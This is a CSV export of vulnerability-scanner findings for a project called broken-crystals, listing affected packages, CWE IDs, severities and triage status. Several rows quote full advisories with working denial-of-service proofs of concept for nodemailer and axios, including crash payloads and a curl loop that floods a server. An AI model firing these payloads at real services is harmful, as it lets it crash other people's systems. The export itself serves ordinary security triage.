GRP-broken-crystals-CWE-668-725,trivy,broken-crystals,CWE-668,low,libmagickcore-dev@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: possible read or write in postscript files,pending,low,no,1
GRP-broken-crystals-CWE-668-726,trivy,broken-crystals,CWE-668,low,libmagickwand-6-headers@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: possible read or write in postscript files,pending,low,no,1
GRP-broken-crystals-CWE-668-727,trivy,broken-crystals,CWE-668,low,libmagickwand-6.q16-6@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: possible read or write in postscript files,pending,low,no,1
GRP-broken-crystals-CWE-668-728,trivy,broken-crystals,CWE-668,low,libmagickwand-6.q16-dev@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: possible read or write in postscript files,pending,low,no,1
GRP-broken-crystals-CWE-668-729,trivy,broken-crystals,CWE-668,low,libmagickwand-dev@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: possible read or write in postscript files,pending,low,no,1
GRP-broken-crystals-CWE-670-730,trivy,broken-crystals,CWE-670,medium,linux-libc-dev@4.19.269-1,kernel: net: USB: Fix wrong-direction WARNING in plusb.c,pending,low,no,1
GRP-broken-crystals-CWE-674-731,trivy,broken-crystals,CWE-674,low,libcroco3@0.6.12-3,libcroco: Stack overflow in function cr_parser_parse_any_core in cr-parser.c,pending,low,no,1
GRP-broken-crystals-CWE-674-732,trivy,broken-crystals,CWE-674,medium,libsqlite3-0@3.27.2-3+deb10u2,sqlite: infinite recursion via certain types of self-referential views in conjunction with ALTER TABLE statements,pending,low,no,1
GRP-broken-crystals-CWE-674-733,trivy,broken-crystals,CWE-674,medium,libsqlite3-dev@3.27.2-3+deb10u2,sqlite: infinite recursion via certain types of self-referential views in conjunction with ALTER TABLE statements,pending,low,no,1
GRP-broken-crystals-CWE-674-734,trivy,broken-crystals,CWE-674,medium,libsystemd0@241-7~deb10u9,systemd: Uncontrolled recursion in systemd-tmpfiles when removing files,pending,low,no,1
GRP-broken-crystals-CWE-674-735,trivy,broken-crystals,CWE-674,medium,libudev1@241-7~deb10u9,systemd: Uncontrolled recursion in systemd-tmpfiles when removing files,pending,low,no,1
GRP-broken-crystals-CWE-674-736,trivy,broken-crystals,CWE-674,high,linux-libc-dev@4.19.269-1,kernel: ipv6: Fix infinite recursion in fib6_dump_done().,pending,low,no,1
GRP-broken-crystals-CWE-686-737,trivy,broken-crystals,CWE-686,medium,libpq-dev@11.19-0+deb10u1,postgresql: Memory disclosure in aggregate function calls,pending,low,no,1
GRP-broken-crystals-CWE-686-738,trivy,broken-crystals,CWE-686,medium,libpq5@11.19-0+deb10u1,postgresql: Memory disclosure in aggregate function calls,pending,low,no,1
GRP-broken-crystals-CWE-693-739,bearer,broken-crystals,CWE-693,info,src/main.ts:194,"## Description Using default cookie configurations can expose your application to security risks. This vulnerability arises when cookies are set with their default values, making them predictable and easier to exploit. ## Remediations - **Do not** rely on default cookie names. - **Do** use generic, non-descriptive names for session cookies. This makes it harder for attackers to identify and exploit the session management mechanism of your application. - **Do** always specify a `maxAge` or `expires` value to control cookie lifetime. ## References - [Express Security Best Practices](https://expressjs.com/en/advanced/best-practice-security.html#use-cookies-securely)",TP,medium,yes,1
GRP-broken-crystals-CWE-703-740,dep-check,broken-crystals,CWE-703,high,nodemailer:6.9.15,"### Summary A DoS can occur that immediately halts the system due to the use of an unsafe function. ### Details According to **RFC 5322**, nested group structures (a group inside another group) are not allowed. Therefore, in lib/addressparser/index.js, the email address parser performs flattening when nested groups appear, since such input is likely to be abnormal. (If the address is valid, it is added as-is.) In other words, the parser flattens all nested groups and inserts them into the final group list. However, the code implemented for this flattening process can be exploited by malicious input and triggers DoS RFC 5322 uses a colon (:) to define a group, and commas (,) are used to separate members within a group. At the following location in lib/addressparser/index.js: https://github.com/nodemailer/nodemailer/blob/master/lib/addressparser/index.js#L90 there is code that performs this flattening. The issue occurs when the email address parser attempts to process the following kind of malicious address header: ```g0: g1: g2: g3: ... gN: victim@example.com;``` Because no recursion depth limit is enforced, the parser repeatedly invokes itself in the pattern `addressparser → _handleAddress → addressparser → ...` for each nested group. As a result, when an attacker sends a header containing many colons, Nodemailer enters infinite recursion, eventually throwing Maximum call stack size exceeded and causing the process to terminate immediately. Due to the structure of this behavior, no authentication is required, and a single request is enough to shut down the service. The problematic code section is as follows: ```js if (isGroup) { ... if (data.group.length) { let parsedGroup = addressparser(data.group.join(',')); // <- boom! parsedGroup.forEach(member => { if (member.group) { groupMembers = groupMembers.concat(member.group); } else { groupMembers.push(member); } }); } } ``` `data.group` is expected to contain members separated by commas, but in the attacker’s payload the group contains colon `(:)` tokens. Because of this, the parser repeatedly triggers recursive calls for each colon, proportional to their number. ### PoC ``` const nodemailer = require('nodemailer'); function buildDeepGroup(depth) { let parts = []; for (let i = 0; i < depth; i++) { parts.push(`g${i}:`); } return parts.join(' ') + ' user@example.com;'; } const DEPTH = 3000; // <- control depth const toHeader = buildDeepGroup(DEPTH); console.log('to header length:', toHeader.length); const transporter = nodemailer.createTransport({ streamTransport: true, buffer: true, newline: 'unix' }); console.log('parsing start'); transporter.sendMail( { from: 'test@example.com', to: toHeader, subject: 'test', text: 'test' }, (err, info) => { if (err) { console.error('error:', err); } else { console.log('finished :', info && info.envelope); } } ); ``` As a result, when the colon is repeated beyond a certain threshold, the Node.js process terminates immediately. ### Impact The attacker can achieve the following: 1. Force an immediate crash of any server/service that uses Nodemailer 2. Kill the backend process with a single web request 3. In environments using PM2/Forever, trigger a continuous restart loop, causing severe resource exhaustion”",pending,low,no,1
GRP-broken-crystals-CWE-704-741,trivy,broken-crystals,CWE-704,high,imagemagick@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: load of misaligned address at MagickCore/property.c,pending,low,no,1
GRP-broken-crystals-CWE-704-742,trivy,broken-crystals,CWE-704,high,imagemagick-6-common@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: load of misaligned address at MagickCore/property.c,pending,low,no,1
GRP-broken-crystals-CWE-704-743,trivy,broken-crystals,CWE-704,high,imagemagick-6.q16@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: load of misaligned address at MagickCore/property.c,pending,low,no,1
GRP-broken-crystals-CWE-704-744,trivy,broken-crystals,CWE-704,high,libmagickcore-6-arch-config@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: load of misaligned address at MagickCore/property.c,pending,low,no,1
GRP-broken-crystals-CWE-704-745,trivy,broken-crystals,CWE-704,high,libmagickcore-6-headers@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: load of misaligned address at MagickCore/property.c,pending,low,no,1
GRP-broken-crystals-CWE-704-746,trivy,broken-crystals,CWE-704,high,libmagickcore-6.q16-6@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: load of misaligned address at MagickCore/property.c,pending,low,no,1
GRP-broken-crystals-CWE-704-747,trivy,broken-crystals,CWE-704,high,libmagickcore-6.q16-6-extra@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: load of misaligned address at MagickCore/property.c,pending,low,no,1
GRP-broken-crystals-CWE-704-748,trivy,broken-crystals,CWE-704,high,libmagickcore-6.q16-dev@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: load of misaligned address at MagickCore/property.c,pending,low,no,1
GRP-broken-crystals-CWE-704-749,trivy,broken-crystals,CWE-704,high,libmagickcore-dev@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: load of misaligned address at MagickCore/property.c,pending,low,no,1
GRP-broken-crystals-CWE-704-750,trivy,broken-crystals,CWE-704,high,libmagickwand-6-headers@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: load of misaligned address at MagickCore/property.c,pending,low,no,1
GRP-broken-crystals-CWE-704-751,trivy,broken-crystals,CWE-704,high,libmagickwand-6.q16-6@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: load of misaligned address at MagickCore/property.c,pending,low,no,1
GRP-broken-crystals-CWE-704-752,trivy,broken-crystals,CWE-704,high,libmagickwand-6.q16-dev@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: load of misaligned address at MagickCore/property.c,pending,low,no,1
GRP-broken-crystals-CWE-704-753,trivy,broken-crystals,CWE-704,high,libmagickwand-dev@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: load of misaligned address at MagickCore/property.c,pending,low,no,1
GRP-broken-crystals-CWE-704-754,trivy,broken-crystals,CWE-704,high,libpython2.7-minimal@2.7.16-2+deb10u1,python: int() type in PyLong_FromString() does not limit amount of digits converting text to int leading to DoS,pending,low,no,1
GRP-broken-crystals-CWE-704-755,trivy,broken-crystals,CWE-704,high,libpython2.7-stdlib@2.7.16-2+deb10u1,python: int() type in PyLong_FromString() does not limit amount of digits converting text to int leading to DoS,pending,low,no,1
GRP-broken-crystals-CWE-704-756,trivy,broken-crystals,CWE-704,high,libpython3.7-minimal@3.7.3-2+deb10u4,python: int() type in PyLong_FromString() does not limit amount of digits converting text to int leading to DoS,pending,low,no,1
GRP-broken-crystals-CWE-704-757,trivy,broken-crystals,CWE-704,high,libpython3.7-stdlib@3.7.3-2+deb10u4,python: int() type in PyLong_FromString() does not limit amount of digits converting text to int leading to DoS,pending,low,no,1
GRP-broken-crystals-CWE-704-758,trivy,broken-crystals,CWE-704,high,python2.7@2.7.16-2+deb10u1,python: int() type in PyLong_FromString() does not limit amount of digits converting text to int leading to DoS,pending,low,no,1
GRP-broken-crystals-CWE-704-759,trivy,broken-crystals,CWE-704,high,python2.7-minimal@2.7.16-2+deb10u1,python: int() type in PyLong_FromString() does not limit amount of digits converting text to int leading to DoS,pending,low,no,1
GRP-broken-crystals-CWE-704-760,trivy,broken-crystals,CWE-704,high,python3.7@3.7.3-2+deb10u4,python: int() type in PyLong_FromString() does not limit amount of digits converting text to int leading to DoS,pending,low,no,1
GRP-broken-crystals-CWE-704-761,trivy,broken-crystals,CWE-704,high,python3.7-minimal@3.7.3-2+deb10u4,python: int() type in PyLong_FromString() does not limit amount of digits converting text to int leading to DoS,pending,low,no,1
GRP-broken-crystals-CWE-707-762,trivy,broken-crystals,CWE-707,high,libnghttp2-14@1.36.0-2+deb10u1,nghttp2: overly large SETTINGS frames can lead to DoS,pending,low,no,1
GRP-broken-crystals-CWE-73-763,bearer,broken-crystals,CWE-73,info,src/auth/auth.service.ts:43,"## Description Allowing unsanitized dynamic input in file paths can lead to unauthorized file and folder access. This vulnerability arises when dynamic data is used within the file system operations, potentially allowing attackers to access unauthorized or hidden files and folders. ## Remediations - **Do** sanitize all dynamic data and function arguments before using them in file system operations. This step is crucial to prevent unauthorized access. - **Do** use a combination of hard-coded string literals and control logic, instead of directly passing dynamic data or function arguments to file system functions. This ensures safety. ```javascript function write(filename) { switch(filename) { case ""hello.txt"": fs.writeCreateFile(""hello.txt""); break; // Add more cases as necessary } } ``` ## References - [OWASP path traversal](https://owasp.org/www-community/attacks/Path_Traversal)",pending,low,no,1
GRP-broken-crystals-CWE-73-764,bearer,broken-crystals,CWE-73,info,src/file/file.service.ts:19,"## Description Allowing unsanitized dynamic input in file paths can lead to unauthorized file and folder access. This vulnerability arises when dynamic data is used within the file system operations, potentially allowing attackers to access unauthorized or hidden files and folders. ## Remediations - **Do** sanitize all dynamic data and function arguments before using them in file system operations. This step is crucial to prevent unauthorized access. - **Do** use a combination of hard-coded string literals and control logic, instead of directly passing dynamic data or function arguments to file system functions. This ensures safety. ```javascript function write(filename) { switch(filename) { case ""hello.txt"": fs.writeCreateFile(""hello.txt""); break; // Add more cases as necessary } } ``` ## References - [OWASP path traversal](https://owasp.org/www-community/attacks/Path_Traversal)",pending,low,no,1
GRP-broken-crystals-CWE-732-765,trivy,broken-crystals,CWE-732,low,login@1:4.5-1.1,shadow-utils: newgidmap allows unprivileged user to drop supplementary groups potentially allowing privilege escalation,pending,low,no,1
GRP-broken-crystals-CWE-732-766,trivy,broken-crystals,CWE-732,low,passwd@1:4.5-1.1,shadow-utils: newgidmap allows unprivileged user to drop supplementary groups potentially allowing privilege escalation,pending,low,no,1
GRP-broken-crystals-CWE-74-767,trivy,broken-crystals,CWE-74,high,git@1:2.20.1-2+deb10u8,git: arbitrary configuration injection when renaming or deleting a section from a configuration file,TP,medium,yes,1
GRP-broken-crystals-CWE-74-768,trivy,broken-crystals,CWE-74,high,git-man@1:2.20.1-2+deb10u8,git: arbitrary configuration injection when renaming or deleting a section from a configuration file,TP,medium,yes,1
GRP-broken-crystals-CWE-74-769,trivy,broken-crystals,CWE-74,high,libpython2.7-minimal@2.7.16-2+deb10u1,python: CRLF injection via HTTP request method in httplib/http.client,TP,medium,yes,1
GRP-broken-crystals-CWE-74-770,trivy,broken-crystals,CWE-74,high,libpython2.7-stdlib@2.7.16-2+deb10u1,python: CRLF injection via HTTP request method in httplib/http.client,TP,medium,yes,1
GRP-broken-crystals-CWE-74-771,trivy,broken-crystals,CWE-74,high,libpython3.7-minimal@3.7.3-2+deb10u4,python: urllib.parse does not sanitize URLs containing ASCII newline and tabs,TP,medium,yes,1
GRP-broken-crystals-CWE-74-772,trivy,broken-crystals,CWE-74,high,libpython3.7-stdlib@3.7.3-2+deb10u4,python: urllib.parse does not sanitize URLs containing ASCII newline and tabs,TP,medium,yes,1
GRP-broken-crystals-CWE-74-773,trivy,broken-crystals,CWE-74,low,login@1:4.5-1.1,shadow: Improper input validation in shadow-utils package utility chfn,TP,medium,yes,1
GRP-broken-crystals-CWE-74-774,trivy,broken-crystals,CWE-74,low,passwd@1:4.5-1.1,shadow: Improper input validation in shadow-utils package utility chfn,TP,medium,yes,1
GRP-broken-crystals-CWE-74-775,trivy,broken-crystals,CWE-74,high,python2.7@2.7.16-2+deb10u1,python: CRLF injection via HTTP request method in httplib/http.client,TP,medium,yes,1
GRP-broken-crystals-CWE-74-776,trivy,broken-crystals,CWE-74,high,python2.7-minimal@2.7.16-2+deb10u1,python: CRLF injection via HTTP request method in httplib/http.client,TP,medium,yes,1
GRP-broken-crystals-CWE-74-777,trivy,broken-crystals,CWE-74,high,python3.7@3.7.3-2+deb10u4,python: urllib.parse does not sanitize URLs containing ASCII newline and tabs,TP,medium,yes,1
GRP-broken-crystals-CWE-74-778,trivy,broken-crystals,CWE-74,high,python3.7-minimal@3.7.3-2+deb10u4,python: urllib.parse does not sanitize URLs containing ASCII newline and tabs,TP,medium,yes,1
GRP-broken-crystals-CWE-74-779,trivy,broken-crystals,CWE-74,low,cookie@0.5.0,"cookie: cookie accepts cookie name, path, and domain with out of bounds characters",TP,medium,yes,1
GRP-broken-crystals-CWE-75-780,trivy,broken-crystals,CWE-75,high,curl@7.64.0-4+deb10u5,curl: TELNET option IAC injection,pending,low,no,1
GRP-broken-crystals-CWE-75-781,trivy,broken-crystals,CWE-75,high,libcurl3-gnutls@7.64.0-4+deb10u5,curl: TELNET option IAC injection,pending,low,no,1
GRP-broken-crystals-CWE-75-782,trivy,broken-crystals,CWE-75,high,libcurl4@7.64.0-4+deb10u5,curl: TELNET option IAC injection,pending,low,no,1
GRP-broken-crystals-CWE-75-783,trivy,broken-crystals,CWE-75,high,libcurl4-openssl-dev@7.64.0-4+deb10u5,curl: TELNET option IAC injection,pending,low,no,1
GRP-broken-crystals-CWE-754-784,dep-check,broken-crystals,CWE-754,high,axios:1.7.7,"# Denial of Service via **proto** Key in mergeConfig ### Summary The `mergeConfig` function in axios crashes with a TypeError when processing configuration objects containing `__proto__` as an own property. An attacker can trigger this by providing a malicious configuration object created via `JSON.parse()`, causing complete denial of service. ### Details The vulnerability exists in `lib/core/mergeConfig.js` at lines 98-101: ```javascript utils.forEach(Object.keys({ ...config1, ...config2 }), function computeConfigValue(prop) { const merge = mergeMap[prop] || mergeDeepProperties; const configValue = merge(config1[prop], config2[prop], prop); (utils.isUndefined(configValue) && merge !== mergeDirectKeys) || (config[prop] = configValue); }); ``` When `prop` is `'__proto__'`: 1. `JSON.parse('{""__proto__"": {...}}')` creates an object with `__proto__` as an own enumerable property 2. `Object.keys()` includes `'__proto__'` in the iteration 3. `mergeMap['__proto__']` performs prototype chain lookup, returning `Object.prototype` (truthy object) 4. The expression `mergeMap[prop] || mergeDeepProperties` evaluates to `Object.prototype` 5. `Object.prototype(...)` throws `TypeError: merge is not a function` The `mergeConfig` function is called by: - `Axios._request()` at `lib/core/Axios.js:75` - `Axios.getUri()` at `lib/core/Axios.js:201` - All HTTP method shortcuts (`get`, `post`, etc.) at `lib/core/Axios.js:211,224` ### PoC ```javascript import axios from ""axios""; const maliciousConfig = JSON.parse('{""__proto__"": {""x"": 1}}'); await axios.get(""https://httpbin.org/get"", maliciousConfig); ``` **Reproduction steps:** 1. Clone axios repository or `npm install axios` 2. Create file `poc.mjs` with the code above 3. Run: `node poc.mjs` 4. Observe the TypeError crash **Verified output (axios 1.13.4):** ``` TypeError: merge is not a function at computeConfigValue (lib/core/mergeConfig.js:100:25) at Object.forEach (lib/utils.js:280:10) at mergeConfig (lib/core/mergeConfig.js:98:9) ``` **Control tests performed:** | Test | Config | Result | |------|--------|--------| | Normal config | `{""timeout"": 5000}` | SUCCESS | | Malicious config | `JSON.parse('{""__proto__"": {""x"": 1}}')` | **CRASH** | | Nested object | `{""headers"": {""X-Test"": ""value""}}` | SUCCESS | **Attack scenario:** An application that accepts user input, parses it with `JSON.parse()`, and passes it to axios configuration will crash when receiving the payload `{""__proto__"": {""x"": 1}}`. ### Impact **Denial of Service** - Any application using axios that processes user-controlled JSON and passes it to axios configuration methods is vulnerable. The application will crash when processing the malicious payload. Affected environments: - Node.js servers using axios for HTTP requests - Any backend that passes parsed JSON to axios configuration This is NOT prototype pollution - the application crashes before any assignment occurs.",pending,low,no,1
GRP-broken-crystals-CWE-754-785,trivy,broken-crystals,CWE-754,medium,linux-libc-dev@4.19.269-1,kernel: KVM: nVMX: missing consistency checks for CR0 and CR4,pending,low,no,1
GRP-broken-crystals-CWE-754-786,trivy,broken-crystals,CWE-754,high,axios@0.21.4,axios: Axios affected by Denial of Service via __proto__ Key in mergeConfig,pending,low,no,1
GRP-broken-crystals-CWE-754-787,trivy,broken-crystals,CWE-754,high,axios@0.26.1,axios: Axios affected by Denial of Service via __proto__ Key in mergeConfig,pending,low,no,1
GRP-broken-crystals-CWE-755-788,trivy,broken-crystals,CWE-755,medium,libsqlite3-0@3.27.2-3+deb10u2,sqlite: incorrect sqlite3WindowRewrite() error handling leads to mishandling certain parser-tree rewriting,pending,low,no,1
GRP-broken-crystals-CWE-755-789,trivy,broken-crystals,CWE-755,medium,libsqlite3-dev@3.27.2-3+deb10u2,sqlite: incorrect sqlite3WindowRewrite() error handling leads to mishandling certain parser-tree rewriting,pending,low,no,1
GRP-broken-crystals-CWE-763-790,trivy,broken-crystals,CWE-763,medium,linux-libc-dev@4.19.269-1,kernel: Copy_from_user on 64-bit versions may leak kernel information,pending,low,no,1
GRP-broken-crystals-CWE-77-791,trivy,broken-crystals,CWE-77,high,libpython2.7-minimal@2.7.16-2+deb10u1,python: mailcap: findmatch() function does not sanitize the second argument,pending,low,no,1
GRP-broken-crystals-CWE-77-792,trivy,broken-crystals,CWE-77,high,libpython2.7-stdlib@2.7.16-2+deb10u1,python: mailcap: findmatch() function does not sanitize the second argument,pending,low,no,1
GRP-broken-crystals-CWE-77-793,trivy,broken-crystals,CWE-77,high,libpython3.7-minimal@3.7.3-2+deb10u4,python: mailcap: findmatch() function does not sanitize the second argument,pending,low,no,1
GRP-broken-crystals-CWE-77-794,trivy,broken-crystals,CWE-77,high,libpython3.7-stdlib@3.7.3-2+deb10u4,python: mailcap: findmatch() function does not sanitize the second argument,pending,low,no,1
GRP-broken-crystals-CWE-77-795,trivy,broken-crystals,CWE-77,high,python2.7@2.7.16-2+deb10u1,python: mailcap: findmatch() function does not sanitize the second argument,pending,low,no,1
GRP-broken-crystals-CWE-77-796,trivy,broken-crystals,CWE-77,high,python2.7-minimal@2.7.16-2+deb10u1,python: mailcap: findmatch() function does not sanitize the second argument,pending,low,no,1
GRP-broken-crystals-CWE-77-797,trivy,broken-crystals,CWE-77,high,python3.7@3.7.3-2+deb10u4,python: mailcap: findmatch() function does not sanitize the second argument,pending,low,no,1
GRP-broken-crystals-CWE-77-798,trivy,broken-crystals,CWE-77,high,python3.7-minimal@3.7.3-2+deb10u4,python: mailcap: findmatch() function does not sanitize the second argument,pending,low,no,1
GRP-broken-crystals-CWE-770-799,npm-audit,broken-crystals,CWE-770,low,@eslint/plugin-kit,Regular Expression Denial of Service (ReDoS) in @eslint/plugin-kit,pending,low,no,1
GRP-broken-crystals-CWE-770-800,npm-audit,broken-crystals,CWE-770,high,@fastify/multipart,Unlimited consumption of resources in @fastify/multipart,pending,low,no,1
GRP-broken-crystals-CWE-770-801,npm-audit,broken-crystals,CWE-770,high,fastify,Fastify Vulnerable to DoS via Unbounded Memory Allocation in sendWebStream,pending,low,no,1
GRP-broken-crystals-CWE-770-802,dep-check,broken-crystals,CWE-770,high,@fastify/multipart:8.3.0,### Impact The `saveRequestFiles` function does not delete the uploaded temporary files when user cancels the request. ### Patches Fixed in version 8.3.1 and 9.0.3 ### Workarounds Do not use `saveRequestFiles`. ### References This was identified in https://github.com/fastify/fastify-multipart/issues/546 and fixed in https://github.com/fastify/fastify-multipart/pull/567.,pending,low,no,1
GRP-broken-crystals-CWE-770-803,dep-check,broken-crystals,CWE-770,high,axios:1.7.7,"## Summary When Axios runs on Node.js and is given a URL with the `data:` scheme, it does not perform HTTP. Instead, its Node http adapter decodes the entire payload into memory (`Buffer`/`Blob`) and returns a synthetic 200 response. This path ignores `maxContentLength` / `maxBodyLength` (which only protect HTTP responses), so an attacker can supply a very large `data:` URI and cause the process to allocate unbounded memory and crash (DoS), even if the caller requested `responseType: 'stream'`. ## Details The Node adapter (`lib/adapters/http.js`) supports the `data:` scheme. When `axios` encounters a request whose URL starts with `data:`, it does not perform an HTTP request. Instead, it calls `fromDataURI()` to decode the Base64 payload into a Buffer or Blob. Relevant code from [`[httpAdapter](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/adapters/http.js#L231)`](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/adapters/http.js#L231): ```js const fullPath = buildFullPath(config.baseURL, config.url, config.allowAbsoluteUrls); const parsed = new URL(fullPath, platform.hasBrowserEnv ? platform.origin : undefined); const protocol = parsed.protocol || supportedProtocols[0]; if (protocol === 'data:') { let convertedData; if (method !== 'GET') { return settle(resolve, reject, { status: 405, ... }); } convertedData = fromDataURI(config.url, responseType === 'blob', { Blob: config.env && config.env.Blob }); return settle(resolve, reject, { data: convertedData, status: 200, ... }); } ``` The decoder is in [`[lib/helpers/fromDataURI.js](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/helpers/fromDataURI.js#L27)`](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/helpers/fromDataURI.js#L27): ```js export default function fromDataURI(uri, asBlob, options) { ... if (protocol === 'data') { uri = protocol.length ? uri.slice(protocol.length + 1) : uri; const match = DATA_URL_PATTERN.exec(uri); ... const body = match[3]; const buffer = Buffer.from(decodeURIComponent(body), isBase64 ? 'base64' : 'utf8'); if (asBlob) { return new _Blob([buffer], {type: mime}); } return buffer; } throw new AxiosError('Unsupported protocol ' + protocol, ...); } ``` * The function decodes the entire Base64 payload into a Buffer with no size limits or sanity checks. * It does **not** honour `config.maxContentLength` or `config.maxBodyLength`, which only apply to HTTP streams. * As a result, a `data:` URI of arbitrary size can cause the Node process to allocate the entire content into memory. In comparison, normal HTTP responses are monitored for size, the HTTP adapter accumulates the response into a buffer and will reject when `totalResponseBytes` exceeds [`[maxContentLength](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/adapters/http.js#L550)`](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/adapters/http.js#L550). No such check occurs for `data:` URIs. ## PoC ```js const axios = require('axios'); async function main() { // this example decodes ~120 MB const base64Size = 160_000_000; // 120 MB after decoding const base64 = 'A'.repeat(base64Size); const uri = 'data:application/octet-stream;base64,' + base64; console.log('Generating URI with base64 length:', base64.length); const response = await axios.get(uri, { responseType: 'arraybuffer' }); console.log('Received bytes:', response.data.length); } main().catch(err => { console.error('Error:', err.message); }); ``` Run with limited heap to force a crash: ```bash node --max-old-space-size=100 poc.js ``` Since Node heap is capped at 100 MB, the process terminates with an out-of-memory error: ``` <--- Last few GCs ---> … FATAL ERROR: Reached heap limit Allocation failed - JavaScript heap out of memory 1: 0x… node::Abort() … … ``` Mini Real App PoC: A small link-preview service that uses axios streaming, keep-alive agents, timeouts, and a JSON body. It allows data: URLs which axios fully ignore `maxContentLength `, `maxBodyLength` and decodes into memory on Node before streaming enabling DoS. ```js import express from ""express""; import morgan from ""morgan""; import axios from ""axios""; import http from ""node:http""; import https from ""node:https""; import { PassThrough } from ""node:stream""; const keepAlive = true; const httpAgent = new http.Agent({ keepAlive, maxSockets: 100 }); const httpsAgent = new https.Agent({ keepAlive, maxSockets: 100 }); const axiosClient = axios.create({ timeout: 10000, maxRedirects: 5, httpAgent, httpsAgent, headers: { ""User-Agent"": ""axios-poc-link-preview/0.1 (+node)"" }, validateStatus: c => c >= 200 && c < 400 }); const app = express(); const PORT = Number(process.env.PORT || 8081); const BODY_LIMIT = process.env.MAX_CLIENT_BODY || ""50mb""; app.use(express.json({ limit: BODY_LIMIT })); app.use(morgan(""combined"")); app.get(""/healthz"", (req,res)=>res.send(""ok"")); /** * POST /preview { ""url"": ""<http|https|data URL>"" } * Uses axios streaming but if url is data:, axios fully decodes into memory first (DoS vector). */ app.post(""/preview"", async (req, res) => { const url = req.body?.url; if (!url) return res.status(400).json({ error: ""missing url"" }); let u; try { u = new URL(String(url)); } catch { return res.status(400).json({ error: ""invalid url"" }); } // Developer allows using data:// in the allowlist const allowed = new Set([""http:"", ""https:"", ""data:""]); if (!allowed.has(u.protocol)) return res.status(400).json({ error: ""unsupported scheme"" }); const controller = new AbortController(); const onClose = () => controller.abort(); res.on(""close"", onClose); const before = process.memoryUsage().heapUsed; try { const r = await axiosClient.get(u.toString(), { responseType: ""stream"", maxContentLength: 8 * 1024, // Axios will ignore this for data: maxBodyLength: 8 * 1024, // Axios will ignore this for data: signal: controller.signal }); // stream only the first 64KB back const cap = 64 * 1024; let sent = 0; const limiter = new PassThrough(); r.data.on(""data"", (chunk) => { if (sent + chunk.length > cap) { limiter.end(); r.data.destroy(); } else { sent += chunk.length; limiter.write(chunk); } }); r.data.on(""end"", () => limiter.end()); r.data.on(""error"", (e) => limiter.destroy(e)); const after = process.memoryUsage().heapUsed; res.set(""x-heap-increase-mb"", ((after - before)/1024/1024).toFixed(2)); limiter.pipe(res); } catch (err) { const after = process.memoryUsage().heapUsed; res.set(""x-heap-increase-mb"", ((after - before)/1024/1024).toFixed(2)); res.status(502).json({ error: String(err?.message || err) }); } finally { res.off(""close"", onClose); } }); app.listen(PORT, () => { console.log(`axios-poc-link-preview listening on http://0.0.0.0:${PORT}`); console.log(`Heap cap via NODE_OPTIONS, JSON limit via MAX_CLIENT_BODY (default ${BODY_LIMIT}).`); }); ``` Run this app and send 3 post requests: ```sh SIZE_MB=35 node -e 'const n=+process.env.SIZE_MB*1024*1024; const b=Buffer.alloc(n,65).toString(""base64""); process.stdout.write(JSON.stringify({url:""data:application/octet-stream;base64,""+b}))' \ | tee payload.json >/dev/null seq 1 3 | xargs -P3 -I{} curl -sS -X POST ""$URL"" -H 'Content-Type: application/json' --data-binary @payload.json -o /dev/null``` ``` --- ## Suggestions 1. **Enforce size limits** For `protocol === 'data:'`, inspect the length of the Base64 payload before decoding. If `config.maxContentLength` or `config.maxBodyLength` is set, reject URIs whose payload exceeds the limit. 2. **Stream decoding** Instead of decoding the entire payload in one `Buffer.from` call, decode the Base64 string in chunks using a streaming Base64 decoder. This would allow the application to process the data incrementally and abort if it grows too large.",pending,low,no,1
GRP-broken-crystals-CWE-770-804,dep-check,broken-crystals,CWE-770,low,fastify:4.28.1,"### Impact A Denial of Service vulnerability in Fastify’s Web Streams response handling can allow a remote client to exhaust server memory. Applications that return a `ReadableStream` (or `Response` with a Web Stream body) via `reply.send()` are impacted. A slow or non-reading client can trigger unbounded buffering when backpressure is ignored, leading to process crashes or severe degradation. ### Patches The issue is fixed in Fastify 5.7.3. Users should upgrade to 5.7.3 or later. ### Workarounds Avoid sending Web Streams from Fastify responses (e.g., `ReadableStream` or `Response` bodies). Use Node.js streams (`stream.Readable`) or buffered payloads instead until the project can upgrade. ### References - https://hackerone.com/reports/3524779",pending,low,no,1
GRP-broken-crystals-CWE-770-805,dep-check,broken-crystals,CWE-770,info,undici:5.28.4,"### Impact The `fetch()` API supports chained HTTP encoding algorithms for response content according to RFC 9110 (e.g., Content-Encoding: gzip, br). This is also supported by the undici decompress interceptor. However, the number of links in the decompression chain is unbounded and the default maxHeaderSize allows a malicious server to insert thousands compression steps leading to high CPU usage and excessive memory allocation. ### Patches Upgrade to 7.18.2 or 6.23.0. ### Workarounds It is possible to apply an undici interceptor and filter long `Content-Encoding` sequences manually. ### References * https://hackerone.com/reports/3456148 * https://github.com/advisories/GHSA-gm62-xv2j-4w53 * https://curl.se/docs/CVE-2022-32206.html",pending,low,no,1
GRP-broken-crystals-CWE-770-806,trivy,broken-crystals,CWE-770,high,libharfbuzz0b@2.3.1-1,harfbuzz: allows attackers to trigger O(n^2) growth via consecutive marks,pending,low,no,1
